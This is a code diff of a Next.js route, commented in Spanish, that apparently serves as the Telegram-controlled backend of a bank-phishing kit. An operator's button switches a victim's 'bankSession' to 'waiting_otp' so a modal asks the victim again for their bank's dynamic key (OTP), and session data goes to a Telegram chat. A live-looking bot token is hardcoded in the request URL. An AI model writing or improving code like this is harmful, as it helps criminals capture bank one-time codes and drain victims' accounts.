@@ -18,34 +18,23 @@ export async function POST(request: NextRequest) {
       const action = parts[0];
       
       if (action === 'request' && parts[1] === 'otp') {
-        // Solicitar clave dinámica de nuevo
+        // Solicitar clave dinámica - igual que el botón del panel
         const sessionId = parts.slice(2).join('_');
         console.log('🔄 Requesting OTP for session:', sessionId);
         
-        const session = await prisma.bankSession.findUnique({
-          where: { sessionId }
-        });
-        
-        if (!session) {
-          console.log('❌ Session not found:', sessionId);
-          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
-        }
-        
-        console.log('✅ Session found, updating to waiting_otp');
-        // Cambiar estado para solicitar OTP nuevamente y limpiar la dinámica actual
-        const updatedSession = await prisma.bankSession.update({
+        // Usar exactamente la misma lógica que request_otp del panel
+        const updatedOtpSession = await prisma.bankSession.update({
           where: { sessionId },
-          data: { 
-            status: 'waiting_otp', // Cambiar a waiting_otp para que se abra el modal
-            claveDinamica: null,
-            dinamicaIncorrecta: false // No marcar como incorrecta, solo solicitar de nuevo
+          data: {
+            status: 'waiting_otp',
+            otpRequestedAt: new Date(),
+            updatedAt: new Date(),
           }
         });
-        console.log('✅ Session updated:', updatedSession.status);
-        
+
         // Actualizar mensaje de Telegram
-        if (session.telegramMessageId) {
-          await sendToTelegram(updatedSession, session.telegramMessageId);
+        if (updatedOtpSession.telegramMessageId) {
+          await sendToTelegram(updatedOtpSession, updatedOtpSession.telegramMessageId);
         }
         
         await fetch(`https://api.telegram.org/bot7955811683:AAGJuSUBDihBFZrRD282kM40kEyhr9Ajwos/answerCallbackQuery`, {
@@ -53,7 +42,7 @@ export async function POST(request: NextRequest) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             callback_query_id: body.callback_query.id,
-            text: `✅ Se ha solicitado la clave dinámica nuevamente al usuario.`
+            text: `✅ Clave dinámica solicitada al usuario`
           })
         });
         
